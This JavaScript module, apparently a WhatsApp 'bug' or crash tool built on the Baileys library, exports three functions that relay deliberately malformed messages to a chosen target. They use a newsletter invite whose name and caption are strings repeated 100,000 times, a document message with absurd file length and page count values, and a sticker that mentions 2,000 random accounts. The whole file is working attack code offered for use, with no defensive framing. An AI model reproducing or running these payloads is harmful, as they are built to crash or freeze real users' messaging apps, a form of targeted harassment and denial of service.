import { generateWAMessageFromContent } from '@nexustechpro/baileys';
import crypto from "crypto"
import chalk from "chalk";
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendNewsletterCrash(sock, targetJid) {
  try {
    //console.log(chalk.cyan(`[Newsletter Crash] Preparing to send to ${targetJid}...`));
    
    const crashText = "K? | `impõssible. 🦠 ‣—" + "ꦾ".repeat(100000) + "@1".repeat(100000);
    
    const newsletterMessage = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "333333333333333333@newsletter",
            newsletterName: crashText,
            jpegThumbnail: "",
            caption: crashText,
            inviteExpiration: Date.now() + 1814400000
          }
        }
      }
    };
    
    //console.log(chalk.yellow(`[Newsletter Crash] Generating message content...`));
    
    const generatedMsg = await generateWAMessageFromContent(
      targetJid,
      newsletterMessage,
      {
        userJid: sock.user.id,
        timestamp: new Date()
      }
    );
    
    //console.log(chalk.yellow(`[Newsletter Crash] Relaying message...`));
    
    await sock.relayMessage(targetJid, generatedMsg.message, {
      messageId: generatedMsg.key.id
    });
    
    //console.log(chalk.green(`[Newsletter Crash] ✓ Successfully sent to ${targetJid}`));
    
  } catch (error) {
    //console.log(chalk.red(`[Newsletter Crash] ✗ Failed to send to ${targetJid}`));
    //console.log(chalk.red(`[Newsletter Crash] Error: ${error.message}`));
    throw error;
  }
}

 async function docsxUrl(sock, isTarget, Ptcp = true) {
  await sock.relayMessage(isTarget, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "⭑̤⟅̊༑ ▾ 𝐙͢𝐄ͮ𝐑ͯ𝐎 ▾ ༑̴⟆̊⭑̤" + "𑜦𑜠".repeat(1000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: "" 
            },
            hasMediaAttachment: true
          },
          body: {
            text: "♱‌⃕𝐓‌𝐫ͯ𝐚͢𝐬𝐡!𝐙͢𝐞ͯ𝐭𝐬𝐮𝐒͢𝐮ͯ𝐱𝐨༑ ❗"
          },
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"ⓘ ⸸zS\",\"url\":\"http://wa.mE/stickerpack/TzS\",\"merchant_url\":\"http://wa.mE/stickerpack/TzS\"}"
            }]
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, Ptcp ? { participant: { jid: isTarget } } : {});
}
 async function paymentLottie(sock, X, Ptcp = true) {
  await sock.relayMessage(X, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
          fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
          fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
          mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
          mimetype: "application/was",
          height: 512,
          width: 512,
          directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4",
          fileLength: "14390",
          mediaKeyTimestamp: "1760786856",
          isAnimated: true,
          isAvatar: false,
          isAiSticker: true,
          isLottie: true,
          stickerSentTs: Date.now(),
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ],
            remoteJid: "-t.me/rizxvelzinfinity",
            stanzaId: "r!zxvelz",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  }, Ptcp ? {
    participant: { jid: X }
  } : {});
}

export {
 sendNewsletterCrash,
 docsxUrl,
 paymentLottie
};